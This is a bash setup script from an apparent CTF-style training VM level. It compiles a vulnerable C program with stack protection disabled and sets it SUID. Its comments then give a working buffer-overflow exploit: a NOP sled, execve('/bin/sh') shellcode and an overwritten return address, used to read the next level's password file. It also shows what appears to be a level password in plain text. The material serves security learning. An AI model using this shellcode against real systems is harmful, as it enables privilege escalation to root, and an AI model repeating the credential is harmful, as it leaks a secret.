#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c bonus1@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh bonus1@VM_IP:/tmp                 #
#                                                                               #
#     pwd: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc -fno-stack-protector -z execstack source.c -o ft_bonus0
# -fno-stack-protector : https://stackoverflow.com/questions/1345670/stack-smashing-detected
# -z execstack : https://security.stackexchange.com/questions/186506/how-does-gcc-compiler-guard-stack-for-stack-overflow

# Set SUID to give root user permissions
chmod u+s ft_bonus0

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_bonus0 ~


# Then you have to run the program and cat .pass as bonus0 by taping manually these commands

#	su bonus0
#	// check the new p()'s buffer address, in this exemple it is 0xbfffe670 so 0xbfffe670 + 80 = 0xbfffe6c0 (\xc0\xe6\xff\xbf).
#   // the offset may also changed, here is 12
#	(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "A" * 12 + "\xc0\xe6\xff\xbf" + "B" * 4'; cat) | /home/user/bonus1/ft_bonus0
#	cat /home/user/bonus1/.pass
